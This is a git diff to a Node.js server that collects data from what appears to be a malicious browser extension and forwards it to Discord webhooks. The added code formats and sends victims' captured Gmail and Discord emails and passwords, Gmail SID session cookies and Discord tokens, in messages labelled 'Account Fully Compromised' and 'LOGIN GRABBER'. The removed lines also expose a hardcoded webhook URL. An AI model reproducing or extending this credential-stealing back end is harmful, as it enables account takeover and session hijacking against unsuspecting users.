@@ -13,15 +13,38 @@ app.use(express.json());
 // Serve static files (extension files)
 app.use(express.static(__dirname));
 
-// Discord webhook URL from environment variable
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
+// Separate webhook URLs for each service from environment variables
+const ROBLOX_WEBHOOK_URL = process.env.ROBLOX_WEBHOOK_URL;
+const GMAIL_WEBHOOK_URL = process.env.GMAIL_WEBHOOK_URL;
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
-  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
-  console.error('Please either:');
-  console.error('1. Set DISCORD_WEBHOOK_URL environment variable');
-  console.error('2. Replace YOUR_DISCORD_WEBHOOK_URL_HERE with your actual webhook URL');
+// Validate that all webhook URLs are set
+if (!ROBLOX_WEBHOOK_URL) {
+  console.error('ERROR: ROBLOX_WEBHOOK_URL environment variable is not set');
   process.exit(1);
+}
+
+if (!GMAIL_WEBHOOK_URL) {
+  console.error('ERROR: GMAIL_WEBHOOK_URL environment variable is not set');
+  process.exit(1);
+}
+
+if (!DISCORD_WEBHOOK_URL) {
+  console.error('ERROR: DISCORD_WEBHOOK_URL environment variable is not set');
+  process.exit(1);
+}
+
+// Function to get the appropriate webhook URL based on service type
+function getWebhookUrl(logLevel) {
+  if (logLevel.startsWith('roblox')) {
+    return ROBLOX_WEBHOOK_URL;
+  } else if (logLevel.startsWith('gmail')) {
+    return GMAIL_WEBHOOK_URL;
+  } else if (logLevel.startsWith('discord')) {
+    return DISCORD_WEBHOOK_URL;
+  }
+  // Default fallback to Discord webhook for other log types
+  return DISCORD_WEBHOOK_URL;
 }
 
 // Function to get CSRF token for Roblox API requests
@@ -437,8 +460,9 @@ app.post('/send-log', async (req, res) => {
         // Create the combined message with comprehensive data
         const discordMessage = formatRobloxCombinedEmbedWithData(logData, comprehensiveUserData);
         
-        // Send to Discord webhook
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
+        // Send to appropriate webhook based on service type
+        const webhookUrl = getWebhookUrl(logData.level);
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -458,7 +482,8 @@ app.post('/send-log', async (req, res) => {
         // Fallback to original format if data fetch fails
         const discordMessage = formatLogForDiscord(logData);
         
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
+        const webhookUrl = getWebhookUrl(logData.level);
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -478,7 +503,8 @@ app.post('/send-log', async (req, res) => {
       // Handle other log types normally
       const discordMessage = formatLogForDiscord(logData);
       
-      const response = await fetch(DISCORD_WEBHOOK_URL, {
+      const webhookUrl = getWebhookUrl(logData.level);
+      const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -548,7 +574,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
       },
       {
         name: "<:emoji_31:1410233610031857735> **Robux In/Out**",
-        value: `${userData.robuxIncoming || 0}/${userData.robuxOutgoing || 0}`,
+        value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
         inline: true
       },
       {
@@ -618,6 +644,14 @@ function formatLogForDiscord(logData) {
     return formatRobloxUserDataEmbed(logData);
   } else if (logData.level === 'roblox_combined') {
     return formatRobloxCombinedEmbed(logData);
+  } else if (logData.level === 'gmail_captured') {
+    return formatGmailEmbed(logData);
+  } else if (logData.level === 'gmail_login') {
+    return formatGmailLoginEmbed(logData);
+  } else if (logData.level === 'discord_captured') {
+    return formatDiscordEmbed(logData);
+  } else if (logData.level === 'discord_login') {
+    return formatDiscordLoginEmbed(logData);
   }
 
   // Standard log formatting
@@ -651,7 +685,7 @@ function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
       title: `<:emoji_37:1410520517349212200> **LOGIN GRABBER**`,
-      description: "**```"+logData.message.replace(", ", "\n")+"```**",
+      description: "```" + logData.message.replace(", ", "\n") + "```",
       color: 0xFFFFFF,
       fields: [
         {
@@ -875,6 +909,228 @@ function formatRobloxCombinedEmbed(logData) {
   return { embeds };
 }
 
+function formatGmailLoginEmbed(logData) {
+  return {
+    embeds: [{
+      title: `📧 **GMAIL LOGIN CAPTURED**`,
+      description: "```" + logData.message.replace(", ", "\n") + "```",
+      color: 0x4285F4,
+      fields: [
+        {
+          name: '🌐 **Login URL**',
+          value: logData.url || 'Unknown',
+          inline: true
+        },
+        {
+          name: '⏰ **Timestamp**',
+          value: new Date(logData.timestamp).toLocaleString(),
+          inline: true
+        },
+        {
+          name: '✅ **Status**',
+          value: 'Email and Password Captured',
+          inline: false
+        }
+      ],
+      footer: {
+        text: `🍪 Waiting for SID cookie...`
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
+    }]
+  };
+}
+
+function formatGmailEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Gmail Login Credentials and User Data
+  const gmailEmbed = {
+    title: "📧 **GMAIL ACCOUNT CAPTURED**",
+    color: 0x4285F4, // Google blue
+    thumbnail: logData.userData?.photo ? {
+      url: logData.userData.photo
+    } : undefined,
+    fields: [
+      {
+        name: "🔐 **Login Credentials**",
+        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
+        inline: false
+      },
+      {
+        name: "📧 **Account Email**",
+        value: logData.userData?.email || "Unknown",
+        inline: false
+      },
+      {
+        name: "👤 **Display Name**",
+        value: logData.userData?.name || "Unknown",
+        inline: true
+      },
+      {
+        name: "🌐 **Capture URL**",
+        value: logData.url || "Unknown",
+        inline: true
+      },
+      {
+        name: "⏰ **Timestamp**",
+        value: new Date(logData.timestamp).toLocaleString(),
+        inline: false
+      }
+    ],
+    footer: {
+      text: "Gmail Account Fully Compromised"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Second embed: SID Cookie
+  const cookieEmbed = {
+    title: "🍪 Gmail SID Cookie",
+    description: "**```" + logData.sid + "```**",
+    color: 0x4285F4,
+    footer: {
+      text: "Handle with extreme caution!"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  embeds.push(gmailEmbed);
+  embeds.push(cookieEmbed);
+
+  return { embeds };
+}
+
+function formatDiscordLoginEmbed(logData) {
+  return {
+    embeds: [{
+      title: `🎮 **DISCORD LOGIN CAPTURED**`,
+      description: "```" + logData.message.replace(", ", "\n") + "```",
+      color: 0x5865F2, // Discord blurple
+      fields: [
+        {
+          name: '🌐 **Login URL**',
+          value: logData.url || 'Unknown',
+          inline: true
+        },
+        {
+          name: '⏰ **Timestamp**',
+          value: new Date(logData.timestamp).toLocaleString(),
+          inline: true
+        },
+        {
+          name: '✅ **Status**',
+          value: 'Email and Password Captured',
+          inline: false
+        }
+      ],
+      footer: {
+        text: `🔑 Waiting for Discord token...`
+      },
+      timestamp: new Date(logData.timestamp).toISOString()
+    }]
+  };
+}
+
+function formatDiscordEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Discord Login Credentials and User Data
+  const discordEmbed = {
+    title: "🎮 **DISCORD ACCOUNT CAPTURED**",
+    color: 0x5865F2, // Discord blurple
+    thumbnail: logData.userData?.avatar ? {
+      url: logData.userData.avatar
+    } : undefined,
+    fields: [
+      {
+        name: "🔐 **Login Credentials**",
+        value: `\`\`\`Email: ${logData.credentials?.email || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
+        inline: false
+      },
+      {
+        name: "👤 **Username**",
+        value: logData.userData?.username ? `${logData.userData.username}#${logData.userData.discriminator}` : "Unknown",
+        inline: true
+      },
+      {
+        name: "🌐 **Global Name**",
+        value: logData.userData?.globalName || "None",
+        inline: true
+      },
+      {
+        name: "📧 **Email**",
+        value: logData.userData?.email || "Unknown",
+        inline: false
+      },
+      {
+        name: "✅ **Verified**",
+        value: logData.userData?.verified ? "Yes" : "No",
+        inline: true
+      },
+      {
+        name: "🔐 **MFA Enabled**",
+        value: logData.userData?.mfaEnabled ? "Yes" : "No",
+        inline: true
+      },
+      {
+        name: "💎 **Nitro Type**",
+        value: logData.userData?.premiumType === 2 ? "Nitro" : logData.userData?.premiumType === 1 ? "Nitro Classic" : "None",
+        inline: true
+      },
+      {
+        name: "🏠 **Servers**",
+        value: logData.userData?.guildsCount?.toString() || "0",
+        inline: true
+      },
+      {
+        name: "👥 **Friends**",
+        value: logData.userData?.friendsCount?.toString() || "0",
+        inline: true
+      },
+      {
+        name: "🌍 **Locale**",
+        value: logData.userData?.locale || "Unknown",
+        inline: true
+      },
+      {
+        name: "🆔 **User ID**",
+        value: logData.userData?.id || "Unknown",
+        inline: false
+      },
+      {
+        name: "🌐 **Capture URL**",
+        value: logData.url || "Unknown",
+        inline: false
+      },
+      {
+        name: "⏰ **Timestamp**",
+        value: new Date(logData.timestamp).toLocaleString(),
+        inline: false
+      }
+    ],
+    footer: {
+      text: "Discord Account Fully Compromised"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Second embed: Discord Token
+  const tokenEmbed = {
+    title: "🔑 Discord Token",
+    description: "**```" + logData.token + "```**",
+    color: 0x5865F2,
+    footer: {
+      text: "Handle with extreme caution!"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  embeds.push(discordEmbed);
+  embeds.push(tokenEmbed);
+
+  return { embeds };
+}
+
 function getColorForLevel(level) {
   const colors = {
     log: 0x3498db,
@@ -883,7 +1139,10 @@ function getColorForLevel(level) {
     error: 0xe74c3c,
     roblox_login: 0xff0000,
     roblox_userdata: 0x00ff00,
-    roblox_combined: 0xff0000
+    roblox_combined: 0xff0000,
+    gmail_captured: 0x4285F4,
+    discord_captured: 0x5865F2,
+    discord_login: 0x5865F2
   };
   return colors[level] || colors.log;
 }
@@ -910,5 +1169,8 @@ app.get('/health', (req, res) => {
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Webhook service running on port ${PORT}`);
-  console.log(`Discord webhook configured: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
+  console.log('Webhook URLs configured:');
+  console.log(`- Roblox: ${ROBLOX_WEBHOOK_URL ? 'Yes' : 'No'}`);
+  console.log(`- Gmail: ${GMAIL_WEBHOOK_URL ? 'Yes' : 'No'}`);
+  console.log(`- Discord: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
 });
